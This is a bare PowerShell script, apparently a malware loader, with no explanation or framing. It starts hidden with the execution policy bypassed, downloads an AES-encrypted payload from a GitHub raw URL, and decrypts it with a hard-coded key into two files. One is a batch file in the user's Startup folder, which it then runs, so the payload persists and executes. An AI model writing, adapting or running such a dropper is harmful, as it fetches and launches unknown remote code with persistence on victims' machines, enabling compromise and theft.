cmd /c start /min ""  powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command "
$url = "https://raw.githubusercontent.com/badgod84/back/refs/heads/main/codenew.txt"
$outputFile1 = "C:\Users\Public\Windows.launch"
$outputFile2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Startup.bat"
$key = [System.Text.Encoding]::UTF8.GetBytes("ThisIsA16ByteKey")
$iv = [System.Text.Encoding]::UTF8.GetBytes("16ByteInitVector")

$tempFilePath = "$env:TEMP\code.txt"
Invoke-WebRequest -Uri $url -OutFile $tempFilePath

$content = Get-Content -Path $tempFilePath -Raw
$parts = $content -split "===SPLIT==="

function Decrypt-File {
    param (
        [string]$encryptedData
    )
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC

  
    $encryptedBytes = [System.Convert]::FromBase64String($encryptedData)
    $ivFromData = $encryptedBytes[0..15]           # L?y IV t? 16 byte d?u tiên
    $encryptedContent = $encryptedBytes[16..($encryptedBytes.Length - 1)] 

    $aes.IV = $ivFromData  
    $decryptor = $aes.CreateDecryptor()
    $decryptedData = $decryptor.TransformFinalBlock($encryptedContent, 0, $encryptedContent.Length)
    $decryptor.Dispose()
    $aes.Dispose()

    return $decryptedData
}

[System.IO.File]::WriteAllBytes($outputFile1, (Decrypt-File -encryptedData $parts[0]))
[System.IO.File]::WriteAllBytes($outputFile2, (Decrypt-File -encryptedData $parts[1]))

Start-Sleep -Seconds 1
Start-Process -FilePath $outputFile2
